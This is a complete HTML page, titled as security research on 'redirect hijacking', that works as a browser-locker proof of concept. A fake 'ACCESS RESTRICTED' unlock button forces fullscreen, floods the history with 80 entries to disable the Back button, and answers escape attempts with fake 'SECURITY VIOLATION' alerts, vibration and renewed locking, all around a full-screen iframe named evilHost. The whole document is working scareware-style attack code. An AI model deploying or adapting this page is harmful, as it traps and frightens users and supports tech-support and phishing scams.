<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Security Research - Redirect Hijacking</title>
    <style>
        body { margin: 0; padding: 0; background: #000; overflow: hidden; height: 100vh; font-family: sans-serif; }
        
        /* IFRAME UTAMA: Mengisi seluruh layar */
        #evilHost {
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
            border: none; display: none; z-index: 9999;
            background: white;
        }

        .start-page {
            display: flex; flex-direction: column; align-items: center;
            justify-content: center; height: 100vh; color: white; text-align: center;
        }
        .btn-start {
            padding: 20px 40px; background: #d93025; color: white;
            border: none; border-radius: 8px; font-weight: bold; cursor: pointer;
            font-size: 1.1rem;
        }
    </style>
</head>
<body>

    <div class="start-page" id="gate">
        <h1 style="color: #ff4d4d;">⚠ ACCESS RESTRICTED</h1>
        <p>Security protocol required to unlock this content.</p>
        <button class="btn-start" onclick="enterThePrison()">UNLOCK NOW</button>
    </div>

    <iframe id="evilHost" src="https://www.wikipedia.org"></iframe> <script>
        const iframe = document.getElementById('evilHost');
        const gate = document.getElementById('gate');

        function enterThePrison() {
            // 1. Tampilkan Iframe & Sembunyikan Gerbang
            gate.style.display = "none";
            iframe.style.display = "block";

            // 2. Fullscreen (Sembunyikan UI Browser)
            const el = document.documentElement;
            if (el.requestFullscreen) el.requestFullscreen();
            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();

            // 3. History Bomb (Kunci Tombol Back)
            for (let i = 0; i < 80; i++) {
                window.history.pushState({p: i}, "", "?session_locked=" + Math.random().toString(36).substring(7));
            }

            alert("Security Tunnel Established. Navigation is now restricted for your protection.");
        }

        // 4. THE ESCAPE BLOCKER (The Loop)
        window.onpopstate = function() {
            if (navigator.vibrate) navigator.vibrate(200);

            // Alert ini memberikan "User Activation" baru untuk re-lock Fullscreen
            alert("⚠️ SECURITY VIOLATION:\nUnauthorized navigation attempt detected.\n\nClick OK to re-secure this session.");

            setTimeout(() => {
                // Re-Lock Fullscreen
                const el = document.documentElement;
                if (el.requestFullscreen) el.requestFullscreen();
                
                // Tambah amunisi history lagi
                for (let i = 0; i < 10; i++) {
                    window.history.pushState(null, "", "?secure_relock=" + Date.now());
                }
            }, 50);
        };
    </script>
</body>
</html>
